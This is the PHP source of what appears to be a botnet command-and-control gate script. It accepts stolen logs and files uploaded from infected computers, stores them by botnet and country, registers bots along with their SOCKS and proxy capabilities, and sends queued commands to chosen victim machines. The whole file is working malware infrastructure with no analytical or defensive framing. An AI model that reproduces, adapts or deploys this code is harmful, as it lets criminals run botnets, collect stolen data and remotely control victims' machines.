<? include_once('system/global.php');
if(!@__CheckHostURL('s.php'))die();
include_once('system/config.php');
if(!mysql_connect(MYSQL_HOST,MYSQL_USER,MYSQL_PASS)||!mysql_select_db(MYSQL_DB))die();
$bn=isset($_GET['i'])&&$_GET['i']!=''?substr($_GET['i'],0,4):DEF_BOTNET;
$rip=isset($_GET['rip'])&&$_GET['rip']!=''&&!strpos($_GET['rip'],'\\')&&!strpos($_GET['rip'],'/')?addslashes(fs($_GET['rip'])):$_SERVER['REMOTE_ADDR'];

if(isset($_GET['1'])&&$_GET['1']!=''&&MODULES&MODULE_LOGS&&$_SERVER['REQUEST_METHOD']=='POST')
{
  $cnt=gcnt();
  if(MODULES&MODULE_LOGS_WFS)
  {
    $file=PATH_LOGS.'/'.$bn.'/'.$cnt;
    if(!createdir($file))die();
    $file.='/'.fs($_GET['1']).'['.$rip.']';
    if(!($f=fopen($file,'ab')))die();
    flock($f,LOCK_EX);fwrite($f,file_get_contents('php://input'));flock($f,LOCK_UN);fclose($f);
    header('Hall: OK');
  }
  if(MODULES&MODULE_LOGS_WDB&&@include_once('system/fmt.php'))
  {
    $tbl=TABLE_LOGS.'_'.gmdate('ymd',time());
    $tdt="id int unsigned NOT NULL auto_increment,comp_id tinytext NOT NULL default '',ip varchar(15) NOT NULL default '0.0.0.0',country varchar(2) NOT NULL default '--',time int unsigned NOT NULL default '0',type tinyint unsigned NOT NULL default '0',proc tinytext NOT NULL default '',av mediumint unsigned NOT NULL default '0',stime int unsigned NOT NULL default '0',gmt mediumint NOT NULL default '0',os tinytext NOT NULL default '',tc int unsigned NOT NULL default '0',lng mediumint unsigned NOT NULL default '0',bn varchar(4) NOT NULL default '',log text NOT NULL default '',PRIMARY KEY(id),KEY id(id)";
    mysql_query('CREATE TABLE IF NOT EXISTS '.$tbl.' ('.$tdt.')');
    if(!Log2SQL($bn,$tbl,fs($_GET['1']),$cnt,$rip,file_get_contents('php://input')))die();
    header('Hall: OK');
  }
  die();
}
else if(isset($_GET['2'])&&$_GET['2']!='')
{
  $cnt=gcnt();
  $ver=(isset($_GET['v'])&&is_numeric($_GET['v']))?$_GET['v']:0;
  $in=(isset($_GET['n'])&&is_numeric($_GET['n']))?$_GET['n']:0;
  $tm=time();
  $q='ip=\''.$rip.'\',time=\''.$tm.'\',country=\''.$cnt.'\',bn=\''.addslashes($bn).'\'';
  if($ver>0)$q.=($in==1?',inst=\''.$ver.'\'':',up=\''.$ver.'\'');
  $cid=addslashes(fs($_GET['2']));
  if(MODULES&MODULE_BOTS_SOCKS||MODULES&MODULE_BOTS_PROXY)
  {
    $r=mysql_query('SELECT time,ot FROM '.TABLE_STATS.' WHERE comp_id=\''.$cid.'\' LIMIT 1');
    if($r&&mysql_affected_rows()>0&&($m=mysql_fetch_row($r)))
    {
      if($m[0]<=($tm-(OPT_BTONT*60))||$m[1]==0)$q.=',ot='.$tm;
    }
    
    if(isset($_GET['s'])&&is_numeric($_GET['s']))$q.=',speed=\''.$_GET['s'].'\'';
    if(isset($_GET['sp'])&&is_numeric($_GET['sp'])&&MODULES&MODULE_BOTS_SOCKS)$q.=',socks=\''.$_GET['sp'].'\'';
    if(isset($_GET['pr'])&&is_numeric($_GET['pr'])&&MODULES&MODULE_BOTS_PROXY)$q.=',proxy=\''.$_GET['pr'].'\'';
  }
  if(isset($_GET['lcp'])&&is_numeric($_GET['lcp'])&&MODULES&MODULE_BOTS_LC_SS)$q.=',lc=\''.$_GET['lcp'].'\'';
  if(!mysql_query('INSERT INTO '.TABLE_STATS.' SET '.$q.',comp_id=\''.$cid.'\',ftime=\''.$tm.'\',ot=\''.$tm.'\'')||mysql_affected_rows()!=1)mysql_query('UPDATE '.TABLE_STATS.' SET '.$q.' WHERE comp_id=\''.$cid.'\' LIMIT 1');
  //mysql_query('INSERT INTO '.TABLE_STATS.' SET '.$q.',comp_id=\''.$cid.'\' ON DUPLICATE KEY UPDATE '.$q);
  header('Hall: OK');
  if(MODULES&MODULE_BOTS_CMDS)
  {
    $cid_=str_replace(array('%','_'),array('\%','\_'),$cid);
    $r=mysql_query('SELECT id,id2,cmds FROM '.TABLE_BCMDS.' WHERE stat=1 AND (lim=0 OR exc<lim) AND ((c=\'\' OR c LIKE BINARY \'%|'.$cnt.'|%\') AND (bns=\'\' OR bns LIKE BINARY \'%|'.$bn.'|%\') AND (comps=\'\' OR comps LIKE BINARY \'%|'.$cid_.'|%\')) AND rcomps NOT LIKE \'%|'.$cid_.'|%\' LIMIT 10');
    if($r&&mysql_affected_rows()>0)while((($m=mysql_fetch_row($r))))
    {
      print pack('SL',strlen($m[2])+4,$m[1]).$m[2];flush();
      mysql_query('UPDATE '.TABLE_BCMDS.' SET exc=exc+1 WHERE id='.$m[0].' LIMIT 1');
    }
  }
}
else if(isset($_GET['3'])&&$_GET['3']!=''&&isset($_GET['id'])&&MODULES&MODULE_BOTS_CMDS)
{
  mysql_query('UPDATE '.TABLE_BCMDS.' SET exct=exct+1,rcomps=CONCAT(rcomps,\'|'.addslashes(fs($_GET['3'])).'|\') WHERE id2='.addslashes($_GET['id']).' LIMIT 1');
  header('Hall: OK');
}
else if(isset($_GET['4'])&&$_GET['4']!=''&&MODULES&MODULE_LOGS_FILES&&@include_once('system/fmt.php'))
{
  $fd=file_get_contents('php://input');
  if(isset($_GET['s'])&&strlen($fd)!=$_GET['s'])die();
  $file=PATH_LFILES.'/'.$bn.'/'.fs($_GET['4']).'/'.(isset($_GET['p'])?fs($_GET['p']):'unknown/'.time());
  $file=str_replace('\\','/',$file);
  for($i = 0; $i < 9999; $i++)
  {
    $ext = $i == 0 ? '.dat' : '['.$i.'].dat';
    if(!file_exists($file.$ext))
    {
      $file .= $ext;
      if(!createdir(dirname($file))||!($f=fopen($file,'wb')))die();
      flock($f,LOCK_EX);fwrite($f,DecodeBuffer($fd));flock($f,LOCK_UN);fclose($f);
      header('Hall: OK');
      break;
    }
  }
  //:) Computer==Trash
}
else{header("HTTP/1.0 404 Not Found");die();}
function fs($s){$s=strtolower($s);$c=strlen($s);for($i=0;$i<$c;$i++)if($s[$i]!='\\'&&$s[$i]!='/'&&$s[$i]!='.'){$h=ord($s[$i]);if(($h>=97&&$h<=122)||($h>=48&&$h<=57));else $s[$i]='_';}return $s;}
function gcnt(){global $rip;$ip=sprintf('%u',ip2long($rip));$r=mysql_query('SELECT c FROM '.TABLE_IP2C.' WHERE l<='.$ip.' AND h>='.$ip.' LIMIT 1');if($r&&mysql_affected_rows()==1){$m=mysql_fetch_row($r);return $m[0];}else return '--';}
?>